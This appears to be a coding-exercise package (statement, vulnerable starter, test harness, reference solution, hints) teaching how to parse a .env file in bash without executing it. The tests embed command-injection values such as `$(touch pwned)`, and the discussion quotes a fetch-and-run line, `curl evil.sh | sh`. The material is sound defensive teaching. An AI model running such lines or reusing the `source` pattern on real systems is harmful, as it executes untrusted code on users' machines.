title: Parse a .env File Without Executing It
statement:
Write `envcheck.sh FILE`: validate and normalise a `.env`-style config file, **without executing it**. (The starter does `source "$1"`, which runs any code hidden in the file.)

- Skip blank lines and lines whose first non-space character is `#`. Strip a trailing `\r`.
- An optional `export ` prefix is allowed and dropped.
- Spaces around the key and around `=` are ignored. The value has surrounding spaces trimmed; if it's wrapped in matching `"…"` or `'…'`, the quotes are removed and the inside is kept **verbatim** (inner spaces, `#`, `$`, everything).
- Keys must match `[A-Za-z_][A-Za-z0-9_]*`. A line with an invalid key, or no `=` at all, prints `line N: invalid: LINE` to stderr; keep going and exit 1 at the end.
- If a key repeats, the later value wins.
- Print `KEY=VALUE` lines sorted by **key**.
- Values are never executed or expanded: `$(touch pwned)` is just text.
starter_code:
#!/usr/bin/env bash
# envcheck.sh FILE
source "$1"
env | sort
harness:
(
  cd "$(fresh_dir)"; printf 'B=2\nA=1\n' > .env
  run_solution .env
  expect_eq "prints KEY=VALUE sorted by key" $'A=1\nB=2' "$out"
)
(
  cd "$(fresh_dir)"; printf '# comment\n\n   \n  # indented comment\nK=v\r\n' > .env
  run_solution .env
  if [[ $status == 0 && $out == "K=v" ]]; then pass "comments, blank lines and CRLF"
  else fail "comments, blank lines and CRLF" "status=$status stdout=[$out] stderr=[$err]"; fi
)
(
  cd "$(fresh_dir)"; printf 'export  PATH_X = /opt/bin  \n  NAME=value with spaces   \n' > .env
  run_solution .env
  expect_eq "export prefix and surrounding spaces" $'NAME=value with spaces\nPATH_X=/opt/bin' "$out"
)
(
  cd "$(fresh_dir)"; printf '%s\n' 'GREETING="  hi # not a comment  "' "SINGLE='a b'" 'URL=http://x/?a=b&c=d' > .env
  run_solution .env
  expect_eq "quoted values kept verbatim; = inside values" $'GREETING=  hi # not a comment  \nSINGLE=a b\nURL=http://x/?a=b&c=d' "$out"
)
(
  cd "$(fresh_dir)"; printf 'K=first\nK=second\n' > .env
  run_solution .env
  expect_eq "the later duplicate wins" "K=second" "$out"
)
(
  cd "$(fresh_dir)"; printf 'GOOD=1\n1BAD=2\nno equals sign\nALSO-BAD=3\n' > .env
  run_solution .env
  if [[ $status == 1 && $out == "GOOD=1" && $err == *"line 2: invalid: 1BAD=2"* && $err == *"line 3: invalid"* && $err == *"line 4: invalid"* ]]; then
    pass "invalid lines are reported with line numbers; exit 1"
  else fail "invalid lines are reported with line numbers; exit 1" "status=$status stdout=[$out] stderr=[$err]"; fi
)
(
  cd "$(fresh_dir)"; printf '%s\n' 'EVIL=$(touch pwned)' 'TICKS=`touch pwned2`' > .env
  run_solution .env
  if [[ ! -e pwned && ! -e pwned2 && $out == *'EVIL=$(touch pwned)'* ]]; then pass "never executes the file's contents"
  else fail "never executes the file's contents" "files: $(ls | tr '\n' ' ') stdout=[$out]"; fi
)
(
  cd "$(fresh_dir)"; printf 'A1=x\nA=y\nA_B=z\n' > .env
  run_solution .env
  expect_eq "sorted by key, not by whole line" $'A=y\nA1=x\nA_B=z' "$out"
)
reference_solution:
#!/usr/bin/env bash
# envcheck.sh FILE
if (( $# != 1 )); then
  echo "usage: envcheck.sh FILE" >&2
  exit 2
fi

declare -A env=()
status=0
n=0
# `|| [[ -n $line ]]` handles a last line with no trailing newline.
while IFS= read -r line || [[ -n $line ]]; do
  n=$((n + 1))
  line=${line%$'\r'}
  [[ $line =~ ^[[:space:]]*(#.*)?$ ]] && continue    # blank or comment

  if [[ $line =~ ^[[:space:]]*(export[[:space:]]+)?([^=[:space:]]+)[[:space:]]*=[[:space:]]*(.*)$ ]]; then
    key=${BASH_REMATCH[2]}
    value=${BASH_REMATCH[3]}
    value=${value%"${value##*[![:space:]]}"}         # trim trailing whitespace
    if [[ $value =~ ^\"(.*)\"$ || $value =~ ^\'(.*)\'$ ]]; then
      value=${BASH_REMATCH[1]}                       # unquote, keep the inside verbatim
    fi
    if [[ $key =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]]; then
      env[$key]=$value                               # plain data: nothing is expanded or run
      continue
    fi
  fi
  echo "line $n: invalid: $line" >&2
  status=1
done < "$1"

for key in "${!env[@]}"; do
  printf '%s=%s\n' "$key" "${env[$key]}"
done | sort -t= -k1,1     # sort on the key field only
exit "$status"
hints: Read line by line with `while IFS= read -r line`. `IFS=` keeps leading spaces and `-r` keeps backslashes.
One `[[ $line =~ regex ]]` can capture the optional `export`, the key and the value; the parts land in `BASH_REMATCH`.
Store values in an associative array. Never `eval`, `source` or `declare` a value from the file.
Sorting whole lines puts `A1=` before `A=` because `1` sorts before `=`. Sort on the key only: `sort -t= -k1,1`.
discussion:
**Never `source` or `eval` data.** A `.env` file is *configuration*, but sourcing it executes it as shell code: `EVIL=$(curl evil.sh | sh)` runs on every developer machine and CI box that loads it. The starter does exactly that (see `pwned` appear in the test's directory). This is the same class of bug as SQL injection: data treated as code.

Parsing details that matter:
- **`while IFS= read -r line || [[ -n $line ]]`**: plain `read` strips leading spaces and mangles backslashes, and the plain loop drops a last line with no trailing newline.
- **One anchored regex** beats a chain of `cut`/`sed` calls. `BASH_REMATCH` gives you the captures.
- **Quoted values are verbatim:** inside quotes, `#` is not a comment and spaces matter. Unquoted values have no inner-comment support here, which is simpler than many real `.env` dialects (they disagree with each other, which is why you document yours).
- **Sort by the key field.** Whole-line sorting is subtly wrong because `=` sorts after digits.
- **Report everything, then fail:** listing every invalid line in one run is kinder than failing on the first.

**Follow-ups:** How would you safely load the validated result into the current shell? (`printf -v "$key" '%s' "$value"` after validating the key, or `export -- "$key=$value"`.) Why do 12-factor apps put config in the environment at all?
